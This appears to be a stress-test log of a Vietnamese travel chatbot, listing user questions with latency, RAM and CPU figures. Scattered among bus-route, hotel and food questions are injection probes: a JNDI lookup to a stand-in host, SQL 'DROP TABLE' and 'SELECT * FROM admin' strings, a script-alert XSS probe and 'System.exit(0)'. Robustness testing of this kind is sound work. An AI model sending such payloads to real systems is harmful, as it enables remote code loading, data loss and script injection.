Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
2026-01-14 01:07:53,${jndi:ldap://hack} -- [Ref:70381],5.564,SUCCESS,13.79,43.3
2026-01-14 01:08:53,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.061,SUCCESS,13.75,40.6
2026-01-14 01:09:53,Chùa Cầu có gì đặc biệt về kiến trúc?,6.965,SUCCESS,13.79,42.0
2026-01-14 01:10:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",5.885,SUCCESS,13.78,39.4
2026-01-14 01:11:53,DROP TABLE users; -- [Ref:14982],6.84,SUCCESS,13.71,41.7
2026-01-14 01:12:53,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.034,SUCCESS,13.7,39.1
2026-01-14 01:13:53,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.579,SUCCESS,13.68,37.9
2026-01-14 01:14:53,Bot vô dụng quá. [Ref:22717],6.566,SUCCESS,13.73,40.4
2026-01-14 01:15:53,${jndi:ldap://hack} -- [Ref:50313],6.456,SUCCESS,13.73,41.6
2026-01-14 01:16:53,Bot rác rưởi quá. [Ref:60416],6.66,SUCCESS,13.73,40.2
2026-01-14 01:17:53,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,6.799,SUCCESS,13.71,41.6
2026-01-14 01:18:53,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,2.583,SUCCESS,13.71,39.7
2026-01-14 01:19:53,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,6.561,SUCCESS,13.7,42.0
2026-01-14 01:20:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,7.57,SUCCESS,13.73,39.9
2026-01-14 01:21:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,5.291,SUCCESS,14.04,42.7
2026-01-14 01:22:53,System.exit(0) -- [Ref:16883],6.652,SUCCESS,14.03,41.1
2026-01-14 01:23:53,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.048,SUCCESS,14.04,41.1
2026-01-14 01:24:53,Ý nghĩa lịch sử của  là gì?,9.742,SUCCESS,14.07,41.3
2026-01-14 01:25:53,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.574,SUCCESS,14.17,42.0
2026-01-14 01:26:53,System.exit(0) -- [Ref:79020],6.485,SUCCESS,11.91,31.5
2026-01-14 01:27:53,Mùa này đi Đà Lạt thời tiết thế nào?,6.282,SUCCESS,11.53,12.3
2026-01-14 01:28:53,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.051,SUCCESS,13.98,41.0
2026-01-14 01:29:53,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,7.092,SUCCESS,14.16,72.1
2026-01-14 01:30:53,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.56,SUCCESS,14.17,66.6
2026-01-14 01:31:53,Mùa này đi Nha Trang thời tiết thế nào?,5.706,SUCCESS,14.22,60.2
2026-01-14 01:32:53,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,5.751,SUCCESS,13.81,65.1
2026-01-14 01:33:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.796,SUCCESS,13.86,56.5
2026-01-14 01:34:53,System.exit(0) -- [Ref:79020],5.893,SUCCESS,13.66,59.7
2026-01-14 01:35:53,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.067,SUCCESS,13.8,65.9
2026-01-14 01:36:53,${jndi:ldap://hack} --,6.486,SUCCESS,13.83,64.1
2026-01-14 01:37:53,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,5.617,SUCCESS,13.83,59.6
2026-01-14 01:38:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.078,SUCCESS,13.91,54.5
2026-01-14 01:39:53,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.812,SUCCESS,13.96,57.0
2026-01-14 01:40:53,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.789,SUCCESS,13.95,55.6
2026-01-14 01:41:53,DROP TABLE users; -- [Ref:99903],6.082,SUCCESS,13.94,56.2
2026-01-14 01:42:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.978,SUCCESS,13.79,55.1
2026-01-14 01:43:53,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",5.829,SUCCESS,13.82,53.3
2026-01-14 01:44:53,${jndi:ldap://hack} -- [Ref:93201],6.531,SUCCESS,13.77,54.1
2026-01-14 01:45:53,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",5.879,SUCCESS,13.8,56.7
2026-01-14 01:46:53,Cầu Vàng có gì đặc biệt về kiến trúc?,5.52,SUCCESS,13.85,54.4
2026-01-14 01:47:53,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,5.533,SUCCESS,13.84,54.4
2026-01-14 01:48:53,Bot như hạch quá.,6.362,SUCCESS,13.93,51.6
2026-01-14 01:49:53,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.514,SUCCESS,14.34,55.3
2026-01-14 01:50:53,System.exit(0) -- [Ref:78828],6.663,SUCCESS,14.35,53.2
2026-01-14 01:51:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.85,SUCCESS,14.38,52.0
2026-01-14 01:52:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.905,SUCCESS,14.06,51.3
2026-01-14 01:53:53,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,4.819,SUCCESS,13.85,54.7
2026-01-14 01:54:53,System.exit(0) -- [Ref:74839],6.08,SUCCESS,13.86,53.0
2026-01-14 01:55:53,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.632,SUCCESS,13.85,55.5
2026-01-14 01:56:53,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.458,SUCCESS,13.94,57.6
2026-01-14 01:57:53,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,8.335,SUCCESS,13.88,55.9
2026-01-14 01:58:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.808,SUCCESS,13.88,52.6
2026-01-14 01:59:53,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",5.96,SUCCESS,13.88,53.1
2026-01-14 02:00:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.722,SUCCESS,13.32,45.7
2026-01-14 02:01:53,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",3.734,SUCCESS,13.45,37.5
2026-01-14 02:02:53,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.627,SUCCESS,13.6,32.8
2026-01-14 02:03:53,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,5.496,SUCCESS,13.53,33.6
2026-01-14 02:04:53,Bot vô dụng quá. [Ref:10074],6.602,SUCCESS,13.13,62.7
2026-01-14 02:05:53,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,6.028,SUCCESS,13.21,39.4
2026-01-14 02:06:53,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,9.371,SUCCESS,13.24,50.7
2026-01-14 02:07:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.776,SUCCESS,13.17,45.8
2026-01-14 02:08:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.628,SUCCESS,13.14,45.8
2026-01-14 02:09:53,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.494,SUCCESS,13.16,51.8
2026-01-14 02:10:53,Tại sao Dinh Bảo Đại lại nổi tiếng?,5.57,SUCCESS,13.13,56.5
2026-01-14 02:11:53,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,3.68,SUCCESS,13.12,51.2
2026-01-14 02:12:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.175,SUCCESS,13.11,43.3
2026-01-14 02:13:53,Ý nghĩa lịch sử của Cầu Vàng là gì?,5.708,SUCCESS,13.02,44.2
2026-01-14 02:14:53,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",3.761,SUCCESS,13.06,44.6
2026-01-14 02:15:53,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.323,SUCCESS,13.11,42.5
2026-01-14 02:16:53,Cầu Vàng có gì đặc biệt về kiến trúc?,6.294,SUCCESS,13.04,45.6
2026-01-14 02:17:53,Bot rác rưởi quá.,5.777,SUCCESS,13.04,43.9
2026-01-14 02:18:53,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,3.777,SUCCESS,12.9,43.7
2026-01-14 02:19:53,Bot vô dụng quá. [Ref:22717],6.117,SUCCESS,12.89,43.2
2026-01-14 02:20:53,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.045,SUCCESS,12.57,48.7
2026-01-14 02:21:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.698,SUCCESS,12.53,28.0
2026-01-14 02:22:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi.",5.976,SUCCESS,13.51,40.2
2026-01-14 02:23:53,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,2.611,SUCCESS,13.22,35.5
2026-01-14 02:24:53,DROP TABLE users; -- [Ref:99903],5.997,SUCCESS,13.36,31.5
2026-01-14 02:25:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.268,SUCCESS,13.45,35.1
2026-01-14 02:26:54,Mùa này đi Nha Trang thời tiết thế nào?,5.625,SUCCESS,13.47,40.1
2026-01-14 02:27:54,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",6.327,SUCCESS,13.33,39.9
2026-01-14 02:28:54,Mùa này đi Nha Trang thời tiết thế nào?,5.36,SUCCESS,13.14,43.4
2026-01-14 02:29:54,Bot rác rưởi quá. [Ref:74147],6.239,SUCCESS,13.16,49.8
2026-01-14 02:30:54,Bot ngu dốt quá.,5.809,SUCCESS,13.14,47.6
2026-01-14 02:31:54,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.058,SUCCESS,13.13,43.3
2026-01-14 02:32:54,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,3.752,SUCCESS,13.16,38.4
2026-01-14 02:33:54,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.186,SUCCESS,13.1,39.2
2026-01-14 02:34:54,Mùa này đi Nha Trang thời tiết thế nào?,5.253,SUCCESS,13.14,39.0
2026-01-14 02:35:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.957,SUCCESS,13.16,38.0
2026-01-14 02:36:54,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.066,SUCCESS,13.07,39.4
2026-01-14 02:37:54,Nguồn gốc của  bắt nguồn từ đâu?,14.152,SUCCESS,13.1,38.1
2026-01-14 02:38:54,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,4.951,SUCCESS,13.17,39.0
2026-01-14 02:39:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,3.026,SUCCESS,13.2,39.7
2026-01-14 02:40:54,Bot rác rưởi quá. [Ref:60416],5.54,SUCCESS,13.21,39.3
2026-01-14 02:41:54,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,2.544,SUCCESS,13.12,39.6
2026-01-14 02:42:54,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,5.829,SUCCESS,13.14,38.0
2026-01-14 02:43:54,Bot rác rưởi quá. [Ref:60416],6.102,SUCCESS,12.9,38.3
2026-01-14 02:44:54,<script>alert(1)</script> -- [Ref:69259],5.964,SUCCESS,12.88,38.4
2026-01-14 02:45:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",5.552,SUCCESS,12.91,38.4
2026-01-14 02:46:54,Giới thiệu cho tôi về Tết Nguyên Đán.,7.921,SUCCESS,12.95,39.7
2026-01-14 02:47:54,Bot như hạch quá.,6.118,SUCCESS,12.91,37.2
2026-01-14 02:48:54,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",5.859,SUCCESS,12.32,39.1
2026-01-14 02:49:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.573,SUCCESS,12.37,38.6
2026-01-14 02:50:54,Bot ngu dốt quá.,6.043,SUCCESS,12.15,37.8
2026-01-14 02:51:54,Bot như hạch quá.,6.509,SUCCESS,12.14,38.4
2026-01-14 02:52:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.638,SUCCESS,12.14,41.7
2026-01-14 02:53:54,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.607,SUCCESS,12.14,38.2
2026-01-14 02:54:54,Top 5 địa điểm check-in đẹp nhất tại Hội An.,5.542,SUCCESS,13.95,43.9
2026-01-14 02:55:54,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",5.621,SUCCESS,13.93,47.5
2026-01-14 02:56:54,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.571,SUCCESS,13.73,46.7
2026-01-14 02:57:54,System.exit(0) -- [Ref:74839],6.151,SUCCESS,13.79,46.3
2026-01-14 02:58:54,Có xe khách chạy tuyến TP.HCM - Hội An không?,5.783,SUCCESS,13.62,43.1
2026-01-14 02:59:54,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.555,SUCCESS,13.58,42.7
2026-01-14 03:00:54,System.exit(0) -- [Ref:78828],6.204,SUCCESS,13.58,48.6
2026-01-14 03:01:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.569,SUCCESS,13.62,55.9
2026-01-14 03:02:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.55,SUCCESS,13.55,54.6
2026-01-14 03:03:54,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,5.068,SUCCESS,13.41,37.8
2026-01-14 03:04:54,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.57,SUCCESS,13.38,35.6
2026-01-14 03:05:54,DROP TABLE users; --,5.691,SUCCESS,13.43,35.5
2026-01-14 03:06:54,System.exit(0) -- [Ref:50974],21.67,SUCCESS,13.48,35.4
2026-01-14 03:07:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,4.837,SUCCESS,13.33,35.8
2026-01-14 03:08:54,Ý nghĩa lịch sử của Cầu Vàng là gì?,5.865,SUCCESS,13.33,34.6
2026-01-14 03:09:54,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,5.173,SUCCESS,13.64,36.5
2026-01-14 03:10:54,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.808,SUCCESS,13.67,34.2
2026-01-14 03:11:54,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.742,SUCCESS,13.67,38.0
2026-01-14 03:12:54,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.771,SUCCESS,13.63,35.8
2026-01-14 03:13:54,Tại sao Dinh Bảo Đại lại nổi tiếng?,5.273,SUCCESS,13.45,35.8
2026-01-14 03:14:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.543,SUCCESS,13.44,37.1
2026-01-14 03:15:54,System.exit(0) -- [Ref:28716],5.576,SUCCESS,13.47,34.9
2026-01-14 03:16:54,DROP TABLE users; --,5.599,SUCCESS,13.52,34.8
2026-01-14 03:17:54,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.593,SUCCESS,13.06,37.3
2026-01-14 03:18:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.619,SUCCESS,12.98,31.3
2026-01-14 03:19:54,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.189,SUCCESS,13.14,31.6
2026-01-14 03:20:54,Bot cút đi quá.,6.585,SUCCESS,13.83,38.6
2026-01-14 03:21:54,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.545,SUCCESS,13.77,35.5
2026-01-14 03:22:54,DROP TABLE users; -- [Ref:87971],5.605,SUCCESS,13.59,35.3
2026-01-14 03:23:54,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.582,SUCCESS,13.4,35.9
2026-01-14 03:24:54,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.083,SUCCESS,13.35,33.6
2026-01-14 03:25:54,Bot cút đi quá.,6.484,SUCCESS,13.32,34.0
2026-01-14 03:26:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.644,SUCCESS,13.33,44.6
2026-01-14 03:27:54,Bot rác rưởi quá. [Ref:56073],6.013,SUCCESS,13.33,43.7
2026-01-14 03:28:54,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.552,SUCCESS,13.28,33.9
2026-01-14 03:29:54,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,5.0,SUCCESS,13.32,33.7
2026-01-14 03:30:54,SELECT * FROM admin; -- [Ref:11092],6.474,SUCCESS,13.32,33.3
2026-01-14 03:31:54,Top 5 địa điểm check-in đẹp nhất tại Hội An.,5.658,SUCCESS,13.53,33.9
2026-01-14 03:32:54,Làm sao đi từ TP.HCM ra Hội An bằng máy bay?,3.756,SUCCESS,13.51,33.3
2026-01-14 03:33:54,Bot ngu dốt quá. [Ref:89522],7.978,SUCCESS,13.53,32.8
2026-01-14 03:34:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.578,SUCCESS,13.52,34.6
2026-01-14 03:35:54,Mùa này đi Nha Trang thời tiết thế nào?,5.091,SUCCESS,13.53,33.5
2026-01-14 03:36:54,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,9.004,SUCCESS,13.51,34.1
2026-01-14 03:37:54,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.548,SUCCESS,13.5,32.8
2026-01-14 03:38:54,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.614,SUCCESS,13.47,33.4
2026-01-14 03:39:54,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.841,SUCCESS,13.51,33.4
2026-01-14 03:40:54,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,7.206,SUCCESS,12.94,36.4
2026-01-14 03:41:54,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.019,SUCCESS,12.99,23.9
2026-01-14 03:42:54,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",4.024,SUCCESS,12.96,21.6
2026-01-14 03:43:54,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",3.61,SUCCESS,13.81,34.2
2026-01-14 03:44:54,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",5.906,SUCCESS,13.77,25.9
2026-01-14 03:45:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",3.783,SUCCESS,13.7,33.5
2026-01-14 03:46:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.538,SUCCESS,13.68,31.0
2026-01-14 03:47:54,Đến Nha Trang thì nên đi ăn món gì ngon?,5.444,SUCCESS,13.71,32.4
2026-01-14 03:48:54,Review món Phở bò và địa chỉ ăn ngon.,8.575,SUCCESS,13.38,31.8
2026-01-14 03:49:54,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.506,SUCCESS,13.34,31.7
2026-01-14 03:50:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",5.895,SUCCESS,13.41,40.5
2026-01-14 03:51:54,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,6.631,SUCCESS,13.84,50.3
2026-01-14 03:52:54,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.756,SUCCESS,13.75,33.7
2026-01-14 03:53:54,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.422,SUCCESS,13.62,31.6
2026-01-14 03:54:54,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",5.565,SUCCESS,13.61,31.0
2026-01-14 03:55:54,Bot vô dụng quá. [Ref:10074],6.598,SUCCESS,13.58,32.1
2026-01-14 03:56:54,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.642,SUCCESS,13.58,30.7
2026-01-14 03:57:54,Bot rác rưởi quá.,5.787,SUCCESS,13.58,31.0
2026-01-14 03:58:54,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.09,SUCCESS,13.51,30.9
2026-01-14 03:59:54,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,7.923,SUCCESS,13.52,31.2
2026-01-14 04:00:54,System.exit(0) -- [Ref:28716],5.623,SUCCESS,13.48,31.2
2026-01-14 04:01:54,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.047,SUCCESS,13.46,31.9
2026-01-14 04:02:54,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.062,SUCCESS,13.42,30.3
2026-01-14 04:03:54,Tại sao Chùa Cầu lại nổi tiếng?,6.165,SUCCESS,13.36,29.8
2026-01-14 04:04:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.977,SUCCESS,13.31,31.9
2026-01-14 04:05:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",3.726,SUCCESS,13.02,31.2
2026-01-14 04:06:54,Mùa này đi Nha Trang thời tiết thế nào?,5.168,SUCCESS,12.43,37.5
2026-01-14 04:07:54,${jndi:ldap://hack} -- [Ref:50313],5.977,SUCCESS,12.58,28.3
2026-01-14 04:08:54,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,7.217,SUCCESS,12.48,28.5
2026-01-14 04:09:54,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,6.087,SUCCESS,12.47,19.9
2026-01-14 04:10:54,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,8.061,SUCCESS,12.49,21.9
2026-01-14 04:11:54,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.048,SUCCESS,14.07,29.8
2026-01-14 04:12:54,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.037,SUCCESS,13.57,39.0
2026-01-14 04:13:54,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.575,SUCCESS,13.44,38.1
2026-01-14 04:14:54,Bot bị điên quá. [Ref:90311],6.178,SUCCESS,13.62,42.4
2026-01-14 04:15:54,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",3.849,SUCCESS,13.62,46.8
2026-01-14 04:16:54,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.779,SUCCESS,13.56,42.1
2026-01-14 04:17:55,Cầu Vàng có gì đặc biệt về kiến trúc?,5.372,SUCCESS,13.52,42.0
2026-01-14 04:18:55,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.058,SUCCESS,13.53,43.5
2026-01-14 04:19:55,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.596,SUCCESS,13.57,43.0
2026-01-14 04:20:55,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.772,SUCCESS,13.53,41.7
2026-01-14 04:21:55,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",3.983,SUCCESS,13.53,43.8
2026-01-14 04:22:55,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,5.074,SUCCESS,13.65,40.8
2026-01-14 04:23:55,Bot ngu dốt quá.,5.902,SUCCESS,13.49,44.1
2026-01-14 04:24:55,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,3.451,SUCCESS,13.53,42.4
2026-01-14 04:25:55,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.637,SUCCESS,13.57,39.3
2026-01-14 04:26:55,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.043,SUCCESS,13.42,42.5
2026-01-14 04:27:55,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.33,SUCCESS,13.48,42.0
2026-01-14 04:28:55,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",6.954,SUCCESS,13.29,40.8
2026-01-14 04:29:55,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.658,SUCCESS,13.3,41.4
2026-01-14 04:30:55,Nguồn gốc của  bắt nguồn từ đâu?,6.846,SUCCESS,13.35,42.6
2026-01-14 04:31:55,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,6.534,SUCCESS,13.38,41.5
2026-01-14 04:32:55,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.731,SUCCESS,13.32,40.1
2026-01-14 04:33:55,Bot cút đi quá.,5.935,SUCCESS,12.92,42.2
2026-01-14 04:34:55,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.051,SUCCESS,13.09,42.1
2026-01-14 04:35:55,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.607,SUCCESS,13.16,40.5
2026-01-14 04:36:55,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.053,SUCCESS,13.13,42.4
2026-01-14 04:37:55,Review món Bún bò Huế và địa chỉ ăn ngon.,7.505,SUCCESS,13.16,42.5
2026-01-14 04:38:55,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",3.78,SUCCESS,12.96,40.7
2026-01-14 04:39:55,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.661,SUCCESS,12.99,38.1
